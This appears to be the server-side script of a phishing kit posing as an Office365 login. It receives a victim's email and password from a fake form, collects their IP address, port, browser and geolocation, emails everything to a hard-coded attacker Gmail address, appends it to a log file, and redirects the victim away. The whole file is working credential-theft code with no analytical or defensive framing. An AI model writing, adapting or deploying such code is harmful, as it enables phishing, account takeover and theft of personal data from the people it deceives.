<?php
$Email = $_POST['Email'];
$password = $_POST['password'];
include 'antibots.php';

$TheBoss = "terryanderson0110@gmail.com";
require_once('geoplugin.class.php');

$geoplugin = new geoPlugin();

$ip = $_SERVER["REMOTE_ADDR"];
$port = $_SERVER["REMOTE_PORT"];
$browser = $_SERVER['HTTP_USER_AGENT'];
$adddate = date("D M d, Y g:i a");
$logId = uniqid();
$geoplugin->locate($ip);
$subject = "Office365  - $country ($logId)";
$headers = "From:  Office <noreplay.dgz.gdn@protonmail.com>";

$message .= "---------------|54|---------------\n";
$message .= "Email: $Email\n";
$message .= "Password: $password\n";
$message .= "IP Address : $ip\n";
$message .= "Port : $port\n";
$message .= "Date : $adddate\n";
$message .= "User-Agent: " . $browser . "\n";
$message .= "--------------------------------------------\n";
$message .= "City: {$geoplugin->city}\n";
$message .= "Region: {$geoplugin->region}\n";
$message .= "Country Name: {$geoplugin->countryName}\n";
$message .= "Country Code: {$geoplugin->countryCode}\n";
$message .= "-------------- modified by terryanderson0110@gmail.com -----------------\n";
$message .= "$logId\n";

mail($TheBoss, $subject, $message, $headers);

echo "<html><head><script>window.top.location.href='{LOCATION}';</script></head><body></body></html>";

$fp = fopen("finish2.txt", "a");
fputs($fp, $message);
fclose($fp);
$praga = rand();
$praga = md5($praga);

?>
